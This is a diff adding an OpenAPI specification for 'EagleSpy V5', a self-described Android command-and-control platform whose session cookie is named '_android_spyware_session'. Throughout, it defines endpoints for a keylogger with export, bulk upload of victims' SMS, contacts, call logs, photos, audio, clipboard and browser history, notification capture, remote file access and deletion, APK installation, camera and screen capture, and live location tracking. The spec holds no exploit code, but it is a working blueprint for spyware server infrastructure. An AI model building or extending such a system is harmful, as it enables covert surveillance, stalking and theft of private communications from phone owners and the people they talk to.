@@ -1,0 +1,1408 @@
+openapi: 3.0.3
+info:
+  title: EagleSpy V5 API
+  description: |
+    REST and WebSocket API for EagleSpy V5 — an Android device management
+    and command-and-control platform built on Ruby on Rails.
+
+    ## Authentication
+    Device endpoints require the `X-Device-Token` header and optional
+    HMAC-SHA256 signature (`X-Device-Signature` + `X-Device-Timestamp`).
+    Admin endpoints use session cookies managed by Devise / ActiveAdmin.
+
+    ## WebSocket (ActionCable)
+    Real-time channels are available at `ws://<host>/cable`.
+    See the channel documentation at the bottom of this spec.
+  version: 5.0.0
+  contact:
+    email: costin.canciu@gmail.com
+  license:
+    name: MIT
+    url: https://opensource.org/licenses/MIT
+
+servers:
+  - url: http://localhost:8080
+    description: Local Docker deployment
+  - url: http://localhost:3000
+    description: Local Rails development
+
+tags:
+  - name: Health
+    description: Liveness and readiness probes
+  - name: Config
+    description: Device configuration and TURN credentials
+  - name: Devices
+    description: Device listing and status
+  - name: Commands
+    description: Command polling, sending, and acknowledgement
+  - name: Keylogger
+    description: Keylog ingestion, retrieval, and export
+  - name: Data Ingestion
+    description: Upload SMS, contacts, call logs, media, etc.
+  - name: File Browser
+    description: Remote file system operations
+  - name: File Transfers
+    description: Chunked file upload and finalization
+  - name: Geofence
+    description: Geofence events
+  - name: Notifications
+    description: Device notification capture
+  - name: Statistics
+    description: Device statistics
+  - name: Telemetry
+    description: Internal telemetry (v1)
+  - name: WebRTC
+    description: TURN credentials and signaling
+  - name: Consents
+    description: Device consent management
+  - name: GraphQL
+    description: GraphQL endpoint
+
+paths:
+  # ── Health ────────────────────────────────────────────────
+  /health:
+    get:
+      tags: [Health]
+      summary: Overall health check
+      operationId: healthIndex
+      responses:
+        '200':
+          description: Service is healthy
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthResponse'
+              example:
+                status: ok
+                timestamp: '2026-01-15T12:00:00Z'
+
+  /health/ready:
+    get:
+      tags: [Health]
+      summary: Readiness probe (database + Redis)
+      operationId: healthReady
+      responses:
+        '200':
+          description: Ready
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthResponse'
+        '503':
+          description: Not ready
+
+  /health/live:
+    get:
+      tags: [Health]
+      summary: Liveness probe
+      operationId: healthLive
+      responses:
+        '200':
+          description: Alive
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/HealthResponse'
+
+  # ── Config ────────────────────────────────────────────────
+  /api/config:
+    get:
+      tags: [Config]
+      summary: Retrieve device configuration and TURN credentials
+      operationId: getConfig
+      security:
+        - DeviceToken: []
+      responses:
+        '200':
+          description: Configuration payload
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DeviceConfig'
+              example:
+                turn_url: 'turn:example.com:3478'
+                turn_user: eaglespy
+                turn_credential: secret
+                poll_interval: 15
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+
+  # ── Devices ───────────────────────────────────────────────
+  /api/devices/online:
+    get:
+      tags: [Devices]
+      summary: List online devices
+      operationId: getOnlineDevices
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: Array of online device summaries
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/DeviceSummary'
+
+  # ── Commands ──────────────────────────────────────────────
+  /api/commands/{device_id}:
+    post:
+      tags: [Commands]
+      summary: Poll for pending commands (device → server)
+      operationId: pollCommands
+      security:
+        - DeviceToken: []
+      parameters:
+        - $ref: '#/components/parameters/DeviceIdPath'
+      responses:
+        '200':
+          description: Pending command or empty
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/PendingCommand'
+        '404':
+          $ref: '#/components/responses/NotFound'
+
+  /api/commands/{device_id}/ack:
+    post:
+      tags: [Commands]
+      summary: Acknowledge a command (device → server)
+      operationId: ackCommand
+      security:
+        - DeviceToken: []
+      parameters:
+        - $ref: '#/components/parameters/DeviceIdPath'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [request_id, status]
+              properties:
+                request_id:
+                  type: string
+                  format: uuid
+                status:
+                  type: string
+                  enum: [completed, failed]
+                response_data:
+                  type: object
+            example:
+              request_id: '550e8400-e29b-41d4-a716-446655440000'
+              status: completed
+              response_data: { battery_level: 85 }
+      responses:
+        '200':
+          description: Acknowledged
+        '404':
+          $ref: '#/components/responses/NotFound'
+
+  /api/commands/{device_id}/send_command:
+    post:
+      tags: [Commands]
+      summary: Send a command to a device (admin → server → device)
+      operationId: sendCommand
+      security:
+        - SessionCookie: []
+      parameters:
+        - $ref: '#/components/parameters/DeviceIdPath'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [command]
+              properties:
+                command:
+                  type: string
+                  enum:
+                    - send_sms
+                    - get_sms
+                    - get_device_info
+                    - start_camera
+                    - stop_camera
+                    - get_wifi_info
+                    - get_localtime
+                    - uninstall_app
+                    - install_apk
+                    - launch_app
+                    - get_installed_apps
+                    - get_contacts
+                    - take_picture
+                    - screen_record
+                    - get_location
+                    - get_call_logs
+                    - get_browser_history
+                    - toggle_wifi
+                    - set_audio_mode
+                    - get_notifications
+                    - list_files
+                    - download_file
+                    - upload_file
+                    - delete_file
+                    - preview_file
+                    - rename_file
+                    - move_file
+                    - search_files
+                    - upload_file_chunk
+                params:
+                  type: object
+            example:
+              command: get_device_info
+              params: {}
+      responses:
+        '200':
+          description: Command dispatched; returns PendingCommand
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/PendingCommand'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+
+  # ── Location ──────────────────────────────────────────────
+  /api/location:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload location update from device
+      operationId: uploadLocation
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/LocationPayload'
+      responses:
+        '200':
+          description: Location saved
+
+  # ── Keylogger ─────────────────────────────────────────────
+  /api/keylogger:
+    post:
+      tags: [Keylogger]
+      summary: Upload keylog entries from device
+      operationId: uploadKeylogs
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [device_id, entries]
+              properties:
+                device_id:
+                  type: string
+                entries:
+                  type: array
+                  items:
+                    $ref: '#/components/schemas/KeylogEntry'
+            example:
+              device_id: abc123
+              entries:
+                - keystroke: h
+                  app_package: com.whatsapp
+                  event_type: key_press
+                  client_timestamp: 1705305600
+      responses:
+        '200':
+          description: Entries accepted
+
+  /api/keylogger/ack:
+    post:
+      tags: [Keylogger]
+      summary: Acknowledge keylog batch
+      operationId: ackKeylogs
+      security:
+        - DeviceToken: []
+      responses:
+        '200':
+          description: Acknowledged
+
+  /api/keylogger/data/{device_id}:
+    get:
+      tags: [Keylogger]
+      summary: Retrieve keylog data for a device
+      operationId: getKeylogData
+      security:
+        - SessionCookie: []
+      parameters:
+        - $ref: '#/components/parameters/DeviceIdPath'
+      responses:
+        '200':
+          description: Keylog entries
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/KeylogEntry'
+
+  /api/keylogger/stats/{device_id}:
+    get:
+      tags: [Keylogger]
+      summary: Keylog statistics for a device
+      operationId: getKeylogStats
+      security:
+        - SessionCookie: []
+      parameters:
+        - $ref: '#/components/parameters/DeviceIdPath'
+      responses:
+        '200':
+          description: Statistics object
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/KeylogStats'
+
+  /api/keylogger/export/{device_id}:
+    get:
+      tags: [Keylogger]
+      summary: Export keylogs as CSV or HTML
+      operationId: exportKeylogs
+      security:
+        - SessionCookie: []
+      parameters:
+        - $ref: '#/components/parameters/DeviceIdPath'
+        - name: format
+          in: query
+          schema:
+            type: string
+            enum: [csv, html]
+            default: csv
+      responses:
+        '200':
+          description: Exported file
+          content:
+            text/csv:
+              schema:
+                type: string
+            text/html:
+              schema:
+                type: string
+
+  # ── Data Ingestion ────────────────────────────────────────
+  /api/sms:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload SMS dump
+      operationId: uploadSms
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                file:
+                  type: string
+                  format: binary
+      responses:
+        '200':
+          description: SMS dump accepted
+
+  /api/contacts:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload contacts dump
+      operationId: uploadContacts
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                file:
+                  type: string
+                  format: binary
+      responses:
+        '200':
+          description: Contacts dump accepted
+
+  /api/calls:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload call logs dump
+      operationId: uploadCallLogs
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                file:
+                  type: string
+                  format: binary
+      responses:
+        '200':
+          description: Call logs dump accepted
+
+  /api/photos:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload a photo from device
+      operationId: uploadPhoto
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                file:
+                  type: string
+                  format: binary
+      responses:
+        '200':
+          description: Photo accepted
+
+  /api/audio:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload an audio recording from device
+      operationId: uploadAudio
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                file:
+                  type: string
+                  format: binary
+      responses:
+        '200':
+          description: Audio accepted
+
+  /api/clipboard:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload clipboard content
+      operationId: uploadClipboard
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                content:
+                  type: string
+      responses:
+        '200':
+          description: Clipboard accepted
+
+  /api/app_usage:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload app usage data
+      operationId: uploadAppUsage
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                apps:
+                  type: array
+                  items:
+                    type: object
+      responses:
+        '200':
+          description: App usage accepted
+
+  /api/browser_history:
+    post:
+      tags: [Data Ingestion]
+      summary: Upload browser history
+      operationId: uploadBrowserHistory
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                entries:
+                  type: array
+                  items:
+                    type: object
+      responses:
+        '200':
+          description: Browser history accepted
+
+  /api/notifications:
+    post:
+      tags: [Notifications]
+      summary: Upload captured notifications
+      operationId: uploadNotifications
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                notifications:
+                  type: array
+                  items:
+                    $ref: '#/components/schemas/DeviceNotification'
+      responses:
+        '200':
+          description: Notifications accepted
+
+  /api/notifications/{device_id}:
+    get:
+      tags: [Notifications]
+      summary: List captured notifications for a device
+      operationId: listNotifications
+      security:
+        - SessionCookie: []
+      parameters:
+        - $ref: '#/components/parameters/DeviceIdPath'
+      responses:
+        '200':
+          description: Notifications
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/DeviceNotification'
+
+  # ── Geofence ──────────────────────────────────────────────
+  /api/geofence:
+    post:
+      tags: [Geofence]
+      summary: Submit a geofence breach event
+      operationId: geofenceEvent
+      security:
+        - DeviceToken: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                latitude:
+                  type: number
+                  format: double
+                longitude:
+                  type: number
+                  format: double
+                fence_id:
+                  type: string
+                event:
+                  type: string
+                  enum: [enter, exit]
+      responses:
+        '200':
+          description: Event recorded
+
+  # ── File Browser ──────────────────────────────────────────
+  /api/smartphones/{id}/files:
+    get:
+      tags: [File Browser]
+      summary: List files on device
+      operationId: listFiles
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+        - name: path
+          in: query
+          schema:
+            type: string
+            default: /
+      responses:
+        '200':
+          description: File listing
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/FileEntry'
+    delete:
+      tags: [File Browser]
+      summary: Delete a file on device
+      operationId: deleteFile
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+        - name: path
+          in: query
+          required: true
+          schema:
+            type: string
+      responses:
+        '200':
+          description: Deleted
+
+  /api/smartphones/{id}/files/download:
+    get:
+      tags: [File Browser]
+      summary: Download a file from device
+      operationId: downloadFile
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+        - name: path
+          in: query
+          required: true
+          schema:
+            type: string
+      responses:
+        '200':
+          description: File content
+          content:
+            application/octet-stream:
+              schema:
+                type: string
+                format: binary
+
+  /api/smartphones/{id}/files/upload:
+    post:
+      tags: [File Browser]
+      summary: Upload a file to device
+      operationId: uploadFileToDevice
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                file:
+                  type: string
+                  format: binary
+                path:
+                  type: string
+      responses:
+        '200':
+          description: Uploaded
+
+  /api/smartphones/{id}/files/preview:
+    get:
+      tags: [File Browser]
+      summary: Preview a file (images, text)
+      operationId: previewFile
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+        - name: path
+          in: query
+          required: true
+          schema:
+            type: string
+      responses:
+        '200':
+          description: File preview
+
+  /api/smartphones/{id}/files/rename:
+    post:
+      tags: [File Browser]
+      summary: Rename a file on device
+      operationId: renameFile
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                old_path:
+                  type: string
+                new_name:
+                  type: string
+      responses:
+        '200':
+          description: Renamed
+
+  /api/smartphones/{id}/files/move:
+    post:
+      tags: [File Browser]
+      summary: Move a file on device
+      operationId: moveFile
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                source_path:
+                  type: string
+                destination_path:
+                  type: string
+      responses:
+        '200':
+          description: Moved
+
+  /api/smartphones/{id}/files/search:
+    get:
+      tags: [File Browser]
+      summary: Search files on device
+      operationId: searchFiles
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+        - name: query
+          in: query
+          required: true
+          schema:
+            type: string
+        - name: path
+          in: query
+          schema:
+            type: string
+            default: /
+      responses:
+        '200':
+          description: Search results
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/FileEntry'
+
+  # ── File Transfers (chunked) ──────────────────────────────
+  /file_transfers/upload_chunk:
+    post:
+      tags: [File Transfers]
+      summary: Upload a file chunk
+      operationId: uploadChunk
+      security:
+        - SessionCookie: []
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              required: [upload_id, chunk_index, chunk]
+              properties:
+                upload_id:
+                  type: string
+                  format: uuid
+                chunk_index:
+                  type: integer
+                total_chunks:
+                  type: integer
+                chunk:
+                  type: string
+                  format: binary
+      responses:
+        '200':
+          description: Chunk accepted
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                  chunks_received:
+                    type: integer
+
+  /file_transfers/finalize_upload:
+    post:
+      tags: [File Transfers]
+      summary: Finalize a chunked upload
+      operationId: finalizeUpload
+      security:
+        - SessionCookie: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [upload_id]
+              properties:
+                upload_id:
+                  type: string
+                  format: uuid
+                filename:
+                  type: string
+      responses:
+        '200':
+          description: Upload finalized
+
+  /file_transfers/cleanup_expired_uploads:
+    post:
+      tags: [File Transfers]
+      summary: Remove expired incomplete uploads
+      operationId: cleanupExpired
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: Cleanup completed
+
+  # ── Statistics ────────────────────────────────────────────
+  /devices/{id}/statistics:
+    get:
+      tags: [Statistics]
+      summary: Device statistics (battery, storage, connectivity)
+      operationId: getDeviceStatistics
+      security:
+        - SessionCookie: []
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+      responses:
+        '200':
+          description: Statistics payload
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DeviceStatistics'
+
+  # ── Telemetry (v1) ───────────────────────────────────────
+  /api/v1/telemetry/devices:
+    get:
+      tags: [Telemetry]
+      summary: Internal device telemetry
+      operationId: telemetryDevices
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: Telemetry data
+
+  /api/v1/telemetry/command_queue:
+    get:
+      tags: [Telemetry]
+      summary: Command queue depth
+      operationId: telemetryCommandQueue
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: Queue stats
+
+  /api/v1/telemetry/webrtc_status:
+    get:
+      tags: [Telemetry]
+      summary: WebRTC connection status
+      operationId: telemetryWebrtc
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: WebRTC status
+
+  /api/v1/telemetry/uploads:
+    get:
+      tags: [Telemetry]
+      summary: Upload pipeline status
+      operationId: telemetryUploads
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: Upload stats
+
+  # ── WebRTC ────────────────────────────────────────────────
+  /webrtc/turn_credentials:
+    get:
+      tags: [WebRTC]
+      summary: Get TURN server credentials
+      operationId: getTurnCredentials
+      security:
+        - SessionCookie: []
+      responses:
+        '200':
+          description: TURN credentials
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/TurnCredentials'
+
+  /webrtc/signal:
+    post:
+      tags: [WebRTC]
+      summary: HTTP-based signaling fallback
+      operationId: webrtcSignal
+      security:
+        - SessionCookie: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                device_id:
+                  type: string
+                type:
+                  type: string
+                  enum: [offer, answer, ice_candidate]
+                sdp:
+                  type: string
+                candidate:
+                  type: object
+      responses:
+        '200':
+          description: Signal relayed
+
+  # ── Consents ──────────────────────────────────────────────
+  /apk_installations/consents/grant:
+    post:
+      tags: [Consents]
+      summary: Grant a consent for a device/installation
+      operationId: grantConsent
+      security:
+        - SessionCookie: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                apk_installation_id:
+                  type: integer
+                consent_type:
+                  type: string
+      responses:
+        '200':
+          description: Consent granted
+
+  /apk_installations/consents/revoke:
+    post:
+      tags: [Consents]
+      summary: Revoke a consent
+      operationId: revokeConsent
+      security:
+        - SessionCookie: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                apk_installation_id:
+                  type: integer
+                consent_type:
+                  type: string
+      responses:
+        '200':
+          description: Consent revoked
+
+  # ── GraphQL ───────────────────────────────────────────────
+  /graphql:
+    post:
+      tags: [GraphQL]
+      summary: Execute a GraphQL query
+      operationId: graphql
+      security:
+        - SessionCookie: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [query]
+              properties:
+                query:
+                  type: string
+                variables:
+                  type: object
+                operationName:
+                  type: string
+            example:
+              query: '{ devices { id name batteryLevel } }'
+      responses:
+        '200':
+          description: GraphQL result
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  data:
+                    type: object
+                  errors:
+                    type: array
+                    items:
+                      type: object
+
+components:
+  securitySchemes:
+    DeviceToken:
+      type: apiKey
+      in: header
+      name: X-Device-Token
+      description: |
+        Token shared between device and server. Set via DEVICE_AUTH_TOKEN env
+        var. Optionally accompanied by X-Device-Signature (HMAC-SHA256) and
+        X-Device-Timestamp (Unix epoch, +/-300s skew).
+    SessionCookie:
+      type: apiKey
+      in: cookie
+      name: _android_spyware_session
+      description: Rails session cookie set after Devise login at /admin/login.
+
+  parameters:
+    DeviceIdPath:
+      name: device_id
+      in: path
+      required: true
+      schema:
+        type: string
+      description: Unique device identifier
+
+  responses:
+    Unauthorized:
+      description: Authentication failed
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/Error'
+          example:
+            error: Unauthorized
+            message: Invalid or missing authentication token
+    NotFound:
+      description: Resource not found
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/Error'
+          example:
+            error: Not Found
+            message: 'Device not found: abc123'
+    BadRequest:
+      description: Invalid request
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/Error'
+          example:
+            error: Bad Request
+            message: 'Invalid command: foo'
+
+  schemas:
+    Error:
+      type: object
+      properties:
+        error:
+          type: string
+        message:
+          type: string
+
+    HealthResponse:
+      type: object
+      properties:
+        status:
+          type: string
+          enum: [ok, degraded, error]
+        timestamp:
+          type: string
+          format: date-time
+
+    DeviceConfig:
+      type: object
+      properties:
+        turn_url:
+          type: string
+        turn_user:
+          type: string
+        turn_credential:
+          type: string
+        poll_interval:
+          type: integer
+
+    DeviceSummary:
+      type: object
+      properties:
+        id:
+          type: integer
+        device_id:
+          type: string
+        name:
+          type: string
+        operating_system:
+          type: string
+        is_rooted:
+          type: boolean
+        battery_level:
+          type: integer
+        connectivity:
+          type: string
+        last_seen:
+          type: string
+          format: date-time
+
+    PendingCommand:
+      type: object
+      properties:
+        id:
+          type: integer
+        request_id:
+          type: string
+          format: uuid
+        command:
+          type: string
+        params:
+          type: object
+        status:
+          type: string
+          enum: [pending, processing, completed, failed, timeout]
+        response_data:
+          type: object
+        created_at:
+          type: string
+          format: date-time
+
+    LocationPayload:
+      type: object
+      properties:
+        device_id:
+          type: string
+        latitude:
+          type: number
+          format: double
+        longitude:
+          type: number
+          format: double
+        accuracy:
+          type: number
+        timestamp:
+          type: integer
+
+    KeylogEntry:
+      type: object
+      properties:
+        keystroke:
+          type: string
+        app_package:
+          type: string
+        event_type:
+          type: string
+        client_timestamp:
+          type: integer
+
+    KeylogStats:
+      type: object
+      properties:
+        total_entries:
+          type: integer
+        unique_apps:
+          type: integer
+        date_range:
+          type: object
+          properties:
+            start:
+              type: string
+              format: date-time
+            end:
+              type: string
+              format: date-time
+        top_apps:
+          type: array
+          items:
+            type: object
+            properties:
+              app_package:
+                type: string
+              count:
+                type: integer
+
+    DeviceNotification:
+      type: object
+      properties:
+        package_name:
+          type: string
+        title:
+          type: string
+        content:
+          type: string
+        post_time:
+          type: string
+          format: date-time
+
+    FileEntry:
+      type: object
+      properties:
+        name:
+          type: string
+        path:
+          type: string
+        type:
+          type: string
+          enum: [file, directory]
+        size:
+          type: integer
+        modified_at:
+          type: string
+          format: date-time
+
+    DeviceStatistics:
+      type: object
+      properties:
+        battery_level:
+          type: integer
+        storage_total:
+          type: integer
+        storage_used:
+          type: integer
+        connectivity:
+          type: string
+        uptime:
+          type: integer
+        last_heartbeat:
+          type: string
+          format: date-time
+
+    TurnCredentials:
+      type: object
+      properties:
+        urls:
+          type: array
+          items:
+            type: string
+        username:
+          type: string
+        credential:
+          type: string
+        ttl:
+          type: integer
+
+  # ── ActionCable Channels (informational) ──────────────────
+  # These are WebSocket channels, not REST endpoints.
+  # Connect to ws://<host>/cable and subscribe via ActionCable protocol.
+  #
+  # CommandChannel
+  #   identifier: { channel: "CommandChannel", device_id: "<id>" }
+  #   streams: commands_<device_id>
+  #   actions: send_command, pong
+  #
+  # SignalingChannel
+  #   identifier: { channel: "SignalingChannel", device_id: "<id>", is_admin: "true"|"false" }
+  #   streams: signaling_admin_<device_id>, signaling_device_<device_id>
+  #   actions: offer, answer, ice_candidate, start_stream, stop_stream
+  #
+  # StreamingChannel
+  #   identifier: { channel: "StreamingChannel", device_id: "<id>" }
+  #   streams: streaming_<device_id>
+  #   actions: offer, answer, ice_candidate, start_stream, stop_stream
+  #
+  # LocationChannel
+  #   identifier: { channel: "LocationChannel", device_id: "<id>" }
+  #   streams: location_<device_id>, location_<device_id>_admin
+  #   actions: update_location, watch_device, stop_watching
+  #
+  # KeylogChannel
+  #   identifier: { channel: "KeylogChannel" }
+  #   streams: keylog_stream
+  #
+  # StatisticsChannel
+  #   identifier: { channel: "StatisticsChannel", device_id: "<id>" }
+  #   streams: statistics:device:<device_id>
+  #   actions: request_update
